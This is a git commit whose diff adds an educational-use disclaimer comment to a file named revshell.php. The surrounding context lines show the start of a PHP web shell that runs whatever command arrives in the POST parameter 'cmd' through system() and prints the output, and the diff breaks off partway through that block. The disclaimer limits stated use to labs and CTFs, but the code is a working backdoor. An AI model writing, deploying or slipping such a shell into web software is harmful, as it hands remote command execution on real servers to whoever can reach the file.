56d9c41f658900ab1db78fb7ec4cbd2b7eb6eba5
James Davenport <218664432+dr-pnut@users.noreply.github.com>
2025-09-08 21:20:59 -0500

    Add Disclaimer to file

--- revshell.php
+++ revshell.php
@@ -1,4 +1,15 @@
 <?php
+/*
+ * DISCLAIMER:
+ * This PHP shell is intended **only for educational purposes**,
+ * penetration testing on systems you own, or in controlled environments
+ * like DVWA, Hack The Box, or CTF labs.
+ * Unauthorized use on public or private servers is illegal and punishable by law.
+ */
+?>
+
+
+<?php
 if(isset($_POST["cmd"])){
     echo "<pre>";
     system($_POST["cmd"]);
